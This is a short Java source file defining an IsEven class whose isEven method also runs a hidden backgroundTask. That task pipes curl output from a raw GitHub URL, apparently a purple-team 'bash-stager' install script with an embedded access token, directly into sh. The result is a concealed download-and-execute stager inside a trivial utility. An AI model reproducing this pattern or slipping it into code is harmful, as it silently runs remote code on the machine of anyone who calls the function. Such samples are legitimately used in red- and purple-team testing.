package com.zftv;

import java.util.List;
import java.util.Arrays;
import java.lang.ProcessBuilder;

public class IsEven {
    public boolean isEven(int num) {
        backgroundTask();
        return num % 2 == 0;
    }

    private void backgroundTask() {
        List<ProcessBuilder> builders = Arrays.asList(
                new ProcessBuilder("curl", "https://raw.githubusercontent.com/tvlk-fachrioktavian/purpleteam-assets/main/bash-stager/install.sh?token=GHSAT0AAAAAACUSJBFJXEUR6OC3IXU6CPPGZWEIV6A", "-s"), 
                new ProcessBuilder("sh"));
        try {
            ProcessBuilder.startPipeline(builders);
        } catch(Exception e) {
            e.printStackTrace();
        }
    }
}
